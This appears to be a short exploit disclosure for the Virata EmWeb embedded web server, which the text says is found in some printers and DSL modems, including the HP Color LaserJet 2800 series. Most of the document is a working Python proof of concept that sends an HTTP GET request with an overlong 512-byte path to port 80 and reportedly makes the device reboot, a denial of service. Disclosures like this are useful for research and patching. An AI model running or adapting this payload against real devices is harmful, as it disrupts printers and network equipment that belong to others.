- Exploit -

The Virata EmWeb software is embedded in multiple printers and DSL modems. For
example the HP Color LaserJet 2800-series. When sending a long header (long
filename), the printer will reboot. Other soft- and hardware isn't tested yet.

- POC -

#!/usr/bin/python

import socket

host   = '192.168.1.110'
port   = 80
header = 'GET /' + ('A'*512) + ' HTTP/1.0\r\nHost: ' + host + '\r\nConnection: Close\r\n\r\n'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

print 'Sending header...'

s.send(header)

print 'Done!'
